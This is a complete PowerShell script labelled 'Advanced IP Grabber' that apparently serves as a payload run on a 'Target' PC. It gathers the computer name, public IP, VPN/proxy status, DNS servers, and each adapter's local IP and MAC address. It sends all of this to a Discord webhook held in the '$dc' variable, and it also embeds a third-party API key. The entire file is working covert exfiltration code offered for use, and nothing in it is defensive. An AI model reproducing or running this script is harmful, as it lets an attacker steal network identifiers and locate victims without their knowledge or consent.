$hookurl = "$dc"
$title = "Advanced IP Grabber"
$targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
$description = "Target: **$targetPC**"
$color = '16744960'

# Get the IP configuration for all adapters
$ipConfig = Get-NetIPConfiguration

# Set the values for the embed fields
$fields = @()

# Add the public IP to the fields array
try{$publicIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$publicIP="Error getting Public IP"}

$VpnCheck = Invoke-RestMethod -Method GET -ContentType "application/json" -Uri ("http://proxycheck.io/v2/" + $publicIP + "?key=p44n78-64vd87-95192g-41iq1p")
$type = $VpnCheck."$publicIP".type
$proxy = $VpnCheck."$publicIP".proxy

# Capitalize the first letter of the proxy value
$proxy = $proxy.Substring(0,1).ToUpper() + $proxy.Substring(1)
# Get primary and secondary DNS servers
$DNSServers = (Get-DnsClientServerAddress).ServerAddresses
$primaryDNS = $DNSServers[0]
$secondaryDNS = $DNSServers[1]

# Check if the secondary DNS is an IP address
if ($secondaryDNS -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
    $secondaryDNS = $secondaryDNS
} else {
    $secondaryDNS = "No Secondary DNS Server Set Up"
}

# Add the public IP and DNS information to the fields array

$fields += @{ name = "Public IP Info"; value =  "IP:" + '```' + $publicIP + '```' + "Proxied:" + '```' + $proxy + '`' + "Type:" + '```' + $type + '`' }
$fields += @{ name = "DNS Servers"; value = "*Primary DNS:*" + '```' + $primaryDNS + '```' + "*Secondary DNS:*" + '```' + $secondaryDNS + '```' }

# Iterate through the adapters
foreach ($adapter in $ipConfig.IPv4Address) {
    # Get the local IP address
    $localIP = $adapter.IPAddress

    # Get the adapter name
    $adapterName = $adapter.InterfaceAlias

    # Get the MAC address of the adapter
    $macAddress = (Get-NetAdapter -Name $adapterName).MacAddress

    # Add the adapter information to the fields array
    $adapterValue = "*Local IP:*`n" + '`' + $localIP + '`' + "`n*MAC Address:*`n" + '`' + $macAddress + '`'
    $fields += @{ name = "***$adapterName***"; value = $adapterValue}
}

    # Get the current date and time
    $timestamp = Get-Date -Format ('```' + "MM/dd/yyyy`nh:mm:ss tt" + '```')

    # Add the timestamp field to the embed
    $fields += @{ name = "***Timestamp***"; value = $timestamp }

# Create the embed object
$embed = @{
    title       = $title
    description = $description
    color       = $color
    fields      = $fields
}

$payload = @{
    "embeds" = @($embed)
}

# Convert payload object to json
$payload = ConvertTo-Json -InputObject $payload -Compress -Depth 10

# Use the Discord API to send the embed to a channel
Invoke-RestMethod -Method "Post" -Uri $hookurl -Body $payload -ContentType 'application/json'
